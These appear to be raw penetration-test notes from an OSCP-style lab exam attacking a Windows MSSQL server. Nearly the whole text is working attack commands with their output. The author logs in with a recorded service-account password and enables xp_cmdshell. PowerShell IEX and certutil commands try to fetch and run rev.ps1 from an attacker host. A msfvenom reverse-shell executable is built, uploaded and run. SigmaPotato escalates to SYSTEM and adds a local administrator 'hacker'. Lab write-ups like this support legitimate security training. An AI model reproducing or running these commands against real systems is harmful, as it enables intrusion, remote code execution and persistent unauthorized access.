# nmap 

```

```

since it is open, i have the cred of 
username: :
password: SQLPowerHouse333

run  impacket-mssqlclient svc_sql:SQLPowerHouse333@172.16.114.202 -windows-auth

```
┌──(kali㉿kali)-[~/OSCP/Exam/AD/172.16.114.202]
└─$ impacket-mssqlclient svc_sql:SQLPowerHouse333@172.16.114.202 -windows-auth
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SRV22): Line 1: Changed database context to 'master'.
[*] INFO(SRV22): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (OSCP\svc_sql  dbo@master)> 
SQL (OSCP\svc_sql  dbo@master)> select SYSTEM_USER;
               
------------   
OSCP\svc_sql   

SQL (OSCP\svc_sql  dbo@master)> SELECT IS_SRVROLEMEMBER('sysadmin')
    
-   
1   

SQL (OSCP\svc_sql  dbo@master)> 


SQL (OSCP\svc_sql  dbo@master)> EXEC sp_configure 'show advance options', 1;
ERROR(SRV22): Line 62: The configuration option 'show advance options' does not exist, or it may be an advanced option.
SQL (OSCP\svc_sql  dbo@master)> EXEC sp_configure 'show advanced options', 1;
INFO(SRV22): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (OSCP\svc_sql  dbo@master)> RECONFIGURE
SQL (OSCP\svc_sql  dbo@master)> RECONFIGURE;
SQL (OSCP\svc_sql  dbo@master)> EXEC sp_configure 'xp_cmdshell', 1;
INFO(SRV22): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (OSCP\svc_sql  dbo@master)> RECONFIGURE;
SQL (OSCP\svc_sql  dbo@master)> EXEC xp_cmdshell 'whoami';
output                   
----------------------   
nt service\mssqlserver   

NULL  

```

let us run xp_cmdshell

```

SQL (OSCP\svc_sql  dbo@master)> EXEC sp_configure 'show advance options', 1;
ERROR(SRV22): Line 62: The configuration option 'show advance options' does not exist, or it may be an advanced option.
SQL (OSCP\svc_sql  dbo@master)> EXEC sp_configure 'show advanced options', 1;
INFO(SRV22): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (OSCP\svc_sql  dbo@master)> RECONFIGURE
SQL (OSCP\svc_sql  dbo@master)> RECONFIGURE;
SQL (OSCP\svc_sql  dbo@master)> EXEC sp_configure 'xp_cmdshell', 1;
INFO(SRV22): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (OSCP\svc_sql  dbo@master)> RECONFIGURE;
SQL (OSCP\svc_sql  dbo@master)> EXEC xp_cmdshell 'whoami';
output                   
----------------------   
nt service\mssqlserver   

NULL  
```

downlaod the file now 

powershell -Exec ByPass -NoProfile -c "(New-Object Net.WebClient).DownloadString('http://192.168.49.114:8000/rev.ps1') | IEX"


```bash
EXEC xp_cmdshell 'powershell -w  "IEX((New-Object Net.WebClient).DownloadString(''http://192.168.49.114:8000/rev.ps1''))"'
```

``` bash
 EXEC xp_cmdshell ' powershell -ExecutionPolicy Bypass -Command "[scriptblock]::Create((Invoke-WebRequest "http://192.168.49.114:8000/rev.ps1").Content).Invoke();"'


SQL (OSCP\svc_sql  dbo@master)>  EXEC xp_cmdshell ' powershell -ExecutionPolicy Bypass -Command "[scriptblock]::Create((Invoke-WebRequest "http://192.168.49.114:8000/rev.ps1").Content).Invoke();"'
output                                                                                                                    
-----------------------------------------------------------------------------------------------------------------------                                                                                                                     
Invoke-WebRequest : Unable to connect to the remote server                                                                                                                                                                                  
                                                                                                                                                                                                                                            
At line:1 char:24                                                                                                                                                                                                                           

+ ... k]::Create((Invoke-WebRequest http://192.168.49.114:8000/rev.ps1).Con ...                                           

+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                                                    

    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebExc    

   eption                                                                                                                 

    + FullyQualifiedErrorId : WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand         

                                                                                                                          

NULL                                                                                                                      

SQL (OSCP\svc_sql  dbo@master)> 

```

```
certutil.exe -urlcache -f http://192.168.49.114:8000/rev.ps1 C:\Windows\Temp\rev.ps1

output:

SQL (OSCP\svc_sql  dbo@master)> EXEC xp_cmdshell 'certutil.exe -urlcache -f http://192.168.49.114:8000/rev.ps1 C:\Windows\Temp\rev.ps1';
output                                                                                  
-------------------------------------------------------------------------------------   
****  Online  ****                                                                      

NULL                                                                                    

NULL                                                                                    

CertUtil: -URLCache command FAILED: 0x80072ee2 (WinHttp: 12002 ERROR_WINHTTP_TIMEOUT)   

CertUtil: The operation timed out                                                       

NULL    

```

nxc mssql 
```
nxc mssql {{192.168.178.2}} {{[-u|--username]}} {{username}} {{[-p|--password]}} {{password}} -x {{whoami}}
```

```
nxc mssql 10.10.10.52 -u svc_sql -p 'SQLPowerHouse333' --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'

nxc mssql 172.16.114.202 -u svc_sql -p 'SQLPowerHouse333' --put-file rev.ps1
 C:\\Windows\\Temp\\rev.ps1
EX

```

run  impacket-mssqlclient svc_sql:SQLPowerHouse333@172.16.114.202 -windows-auth

Uploaded the file 
nxc mssql 172.16.114.202 -u svc_sql -p 'SQLPowerHouse333' --put-file rev.ps1 C:\\Users\\Public\\rev.ps1 

![[{9FD091AB-BDBE-44A8-8108-16305998B0AB}.png]]




try again 

```bash

                                                                                                                   
┌──(kali㉿kali)-[~/OSCP/Exam/AD/172.16.114.202]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.114 LPORT=1234 -f exe -o shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: shell.exe
                                                                                                                    
┌──(kali㉿kali)-[~/OSCP/Exam/AD/172.16.114.202]
└─$ nxc mssql 172.16.114.202 -u svc_sql -p 'SQLPowerHouse333' --put-file shell.exe  C:\\Users\\Public\\shell.exe
MSSQL       172.16.114.202  1433   SRV22            [*] Windows 10 / Server 2019 Build 17763 (name:SRV22) (domain:oscp.exam)
MSSQL       172.16.114.202  1433   SRV22            [+] oscp.exam\svc_sql:SQLPowerHouse333 (Pwn3d!)
MSSQL       172.16.114.202  1433   SRV22            [*] Copy shell.exe to C:\Users\Public\shell.exe
MSSQL       172.16.114.202  1433   SRV22            [*] Size is 73802 bytes
MSSQL       172.16.114.202  1433   SRV22            [+] File has been uploaded on the remote machine
                                                                                                                    
┌──(kali㉿kali)-[~/OSCP/Exam/AD/172.16.114.202]
└─$ 


```

```

outputis 


SQL (OSCP\svc_sql  dbo@master)> EXEC xp_cmdshell 'dir C:\Users\public' ;
output                                               
--------------------------------------------------   
 Volume in drive C has no label.                     

 Volume Serial Number is 7CB4-BC42                   

NULL                                                 

 Directory of C:\Users\public                        

NULL                                                 

06/09/2025  03:28 AM    <DIR>          .             

06/09/2025  03:28 AM    <DIR>          ..            

10/09/2024  03:17 PM    <DIR>          Documents     

09/15/2018  12:19 AM    <DIR>          Downloads     

09/15/2018  12:19 AM    <DIR>          Music         

10/09/2024  03:04 PM         3,750,693 offsec.png    

09/15/2018  12:19 AM    <DIR>          Pictures      

06/09/2025  03:18 AM             1,587 rev.exe       

06/09/2025  03:12 AM             1,587 rev.ps1       

06/09/2025  03:30 AM            73,802 shell.exe     

09/15/2018  12:19 AM    <DIR>          Videos        

               4 File(s)      3,827,669 bytes        

               7 Dir(s)  38,566,428,672 bytes free   

NULL                                                 

SQL (OSCP\svc_sql  dbo@master)> EXEC xp_cmdshell 'C:\Users\public\shell.exe' ;
output   
------   
NULL     

```

```
nxc mssql 172.16.114.202 -u svc_sql -p 'SQLPowerHouse333' --local-auth -x C:\Users\public\shell.exe    
```


running whoami /priv

```
┌──(kali㉿kali)-[~/OSCP/Exam/AD/172.16.114.202]
└─$ nxc mssql 172.16.114.202 -u svc_sql -p 'SQLPowerHouse333' -x 'whoami /all'                              
MSSQL       172.16.114.202  1433   SRV22            [*] Windows 10 / Server 2019 Build 17763 (name:SRV22) (domain:oscp.exam)
MSSQL       172.16.114.202  1433   SRV22            [+] oscp.exam\svc_sql:SQLPowerHouse333 (Pwn3d!)
MSSQL       172.16.114.202  1433   SRV22            [+] Executed command via mssqlexec
MSSQL       172.16.114.202  1433   SRV22            USER INFORMATION
MSSQL       172.16.114.202  1433   SRV22            ----------------
MSSQL       172.16.114.202  1433   SRV22            User Name              SID
MSSQL       172.16.114.202  1433   SRV22            ====================== ===============================================================
MSSQL       172.16.114.202  1433   SRV22            nt service\mssqlserver S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003
MSSQL       172.16.114.202  1433   SRV22            GROUP INFORMATION
MSSQL       172.16.114.202  1433   SRV22            -----------------
MSSQL       172.16.114.202  1433   SRV22            Group Name                           Type             SID          Attributes
MSSQL       172.16.114.202  1433   SRV22            ==================================== ================ ============ ==================================================
MSSQL       172.16.114.202  1433   SRV22            Mandatory Label\High Mandatory Level Label            S-1-16-12288
MSSQL       172.16.114.202  1433   SRV22            Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
MSSQL       172.16.114.202  1433   SRV22            BUILTIN\Performance Monitor Users    Alias            S-1-5-32-558 Mandatory group, Enabled by default, Enabled group
MSSQL       172.16.114.202  1433   SRV22            BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
MSSQL       172.16.114.202  1433   SRV22            NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
MSSQL       172.16.114.202  1433   SRV22            CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
MSSQL       172.16.114.202  1433   SRV22            NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
MSSQL       172.16.114.202  1433   SRV22            NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
MSSQL       172.16.114.202  1433   SRV22            LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
MSSQL       172.16.114.202  1433   SRV22            NT SERVICE\ALL SERVICES              Well-known group S-1-5-80-0   Mandatory group, Enabled by default, Enabled group
MSSQL       172.16.114.202  1433   SRV22            PRIVILEGES INFORMATION
MSSQL       172.16.114.202  1433   SRV22            ----------------------
MSSQL       172.16.114.202  1433   SRV22            Privilege Name                Description                               State
MSSQL       172.16.114.202  1433   SRV22            ============================= ========================================= ========
MSSQL       172.16.114.202  1433   SRV22            SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
MSSQL       172.16.114.202  1433   SRV22            SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
MSSQL       172.16.114.202  1433   SRV22            SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
MSSQL       172.16.114.202  1433   SRV22            SeImpersonatePrivilege        Impersonate a client after authentication Enabled
MSSQL       172.16.114.202  1433   SRV22            SeCreateGlobalPrivilege       Create global objects                     Enabled
MSSQL       172.16.114.202  1433   SRV22            SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
MSSQL       172.16.114.202  1433   SRV22            USER CLAIMS INFORMATION
MSSQL       172.16.114.202  1433   SRV22            -----------------------
MSSQL       172.16.114.202  1433   SRV22            User claims unknown.
MSSQL       172.16.114.202  1433   SRV22            Kerberos support for Dynamic Access Control on this device has been disabled.
                                                                                                                                      
```

use potato to get in since i have SeImpersonatePrivilege

upload sigmapotato
```
┌──(kali㉿kali)-[~/OSCP/Exam/AD/172.16.114.202]
└─$ nxc mssql 172.16.114.202 -u svc_sql -p 'SQLPowerHouse333' --put-file SigmaPotato.exe C:\\Users\\Public\\SigmaPotato.exe
MSSQL       172.16.114.202  1433   SRV22            [*] Windows 10 / Server 2019 Build 17763 (name:SRV22) (domain:oscp.exam)
MSSQL       172.16.114.202  1433   SRV22            [+] oscp.exam\svc_sql:SQLPowerHouse333 (Pwn3d!)
MSSQL       172.16.114.202  1433   SRV22            [*] Copy SigmaPotato.exe to C:\Users\Public\SigmaPotato.exe
MSSQL       172.16.114.202  1433   SRV22            [*] Size is 63488 bytes
MSSQL       172.16.114.202  1433   SRV22            [+] File has been uploaded on the remote machine


```

```

SQL (OSCP\svc_sql  dbo@master)> EXEC xp_cmdshell 'dir C:\Users\Public'
output                                                   
------------------------------------------------------   
 Volume in drive C has no label.                         

 Volume Serial Number is 7CB4-BC42                       

NULL                                                     

 Directory of C:\Users\Public                            

NULL                                                     

06/09/2025  03:46 AM    <DIR>          .                 

06/09/2025  03:46 AM    <DIR>          ..                

10/09/2024  03:17 PM    <DIR>          Documents         

09/15/2018  12:19 AM    <DIR>          Downloads         

09/15/2018  12:19 AM    <DIR>          Music             

10/09/2024  03:04 PM         3,750,693 offsec.png        

09/15/2018  12:19 AM    <DIR>          Pictures          

06/09/2025  03:18 AM             1,587 rev.exe           

06/09/2025  03:40 AM             1,587 rev.ps1           

06/09/2025  03:30 AM            73,802 shell.exe         

06/09/2025  03:46 AM            63,488 SigmaPotato.exe   

09/15/2018  12:19 AM    <DIR>          Videos            

               5 File(s)      3,891,157 bytes            

               7 Dir(s)  38,566,363,136 bytes free       

NULL                                                     


```

create user 
username: hacker
password: Password123!

```
──(kali㉿kali)-[~/OSCP/Exam/AD/172.16.114.202]
└─$ nxc mssql 172.16.114.202 -u svc_sql -p 'SQLPowerHouse333' -x 'C:\\Users\\public\\SigmaPotato.exe "net user hacker Password123! /add"'
MSSQL       172.16.114.202  1433   SRV22            [*] Windows 10 / Server 2019 Build 17763 (name:SRV22) (domain:oscp.exam)
MSSQL       172.16.114.202  1433   SRV22            [+] oscp.exam\svc_sql:SQLPowerHouse333 (Pwn3d!)
MSSQL       172.16.114.202  1433   SRV22            [+] Executed command via mssqlexec
MSSQL       172.16.114.202  1433   SRV22            [+] Starting Pipe Server...
MSSQL       172.16.114.202  1433   SRV22            [+] Created Pipe Name: \\.\pipe\SigmaPotato\pipe\epmapper
MSSQL       172.16.114.202  1433   SRV22            [+] Pipe Connected!
MSSQL       172.16.114.202  1433   SRV22            [+] Impersonated Client: NT AUTHORITY\NETWORK SERVICE
MSSQL       172.16.114.202  1433   SRV22            [+] Searching for System Token...
MSSQL       172.16.114.202  1433   SRV22            [+] PID: 872 | Token: 0x812 | User: NT AUTHORITY\SYSTEM
MSSQL       172.16.114.202  1433   SRV22            [+] Found System Token: True
MSSQL       172.16.114.202  1433   SRV22            [+] Duplicating Token...
MSSQL       172.16.114.202  1433   SRV22            [+] New Token Handle: 924
MSSQL       172.16.114.202  1433   SRV22            [+] Current Command Length: 33 characters
MSSQL       172.16.114.202  1433   SRV22            [+] Creating Process via 'CreateProcessAsUserW'
MSSQL       172.16.114.202  1433   SRV22            [+] Process Started with PID: 5116
MSSQL       172.16.114.202  1433   SRV22            [+] Process Output:
MSSQL       172.16.114.202  1433   SRV22            The command completed successfully.


┌──(kali㉿kali)-[~/OSCP/Exam/AD/172.16.114.202]
└─$ nxc mssql 172.16.114.202 -u svc_sql -p 'SQLPowerHouse333' -x 'C:\\Users\\public\\SigmaPotato.exe "net LOCALGROUP administrators hacker /add"' 
MSSQL       172.16.114.202  1433   SRV22            [*] Windows 10 / Server 2019 Build 17763 (name:SRV22) (domain:oscp.exam)
MSSQL       172.16.114.202  1433   SRV22            [+] oscp.exam\svc_sql:SQLPowerHouse333 (Pwn3d!)
MSSQL       172.16.114.202  1433   SRV22            [+] Executed command via mssqlexec
MSSQL       172.16.114.202  1433   SRV22            [+] Starting Pipe Server...
MSSQL       172.16.114.202  1433   SRV22            [+] Created Pipe Name: \\.\pipe\SigmaPotato\pipe\epmapper
MSSQL       172.16.114.202  1433   SRV22            [+] Pipe Connected!
MSSQL       172.16.114.202  1433   SRV22            [+] Impersonated Client: NT AUTHORITY\NETWORK SERVICE
MSSQL       172.16.114.202  1433   SRV22            [+] Searching for System Token...
MSSQL       172.16.114.202  1433   SRV22            [+] PID: 872 | Token: 0x812 | User: NT AUTHORITY\SYSTEM
MSSQL       172.16.114.202  1433   SRV22            [+] Found System Token: True
MSSQL       172.16.114.202  1433   SRV22            [+] Duplicating Token...
MSSQL       172.16.114.202  1433   SRV22            [+] New Token Handle: 920
MSSQL       172.16.114.202  1433   SRV22            [+] Current Command Length: 41 characters
MSSQL       172.16.114.202  1433   SRV22            [+] Creating Process via 'CreateProcessAsUserW'
MSSQL       172.16.114.202  1433   SRV22            [+] Process Started with PID: 3132
MSSQL       172.16.114.202  1433   SRV22            [+] Process Output:
MSSQL       172.16.114.202  1433   SRV22            The command completed successfully.


```
![[{2C93039E-1F3C-412F-9458-435DC5AB970F}.png]]

![[{FA6C501D-0973-4CEE-833E-E1113F150F3E} 1.png]]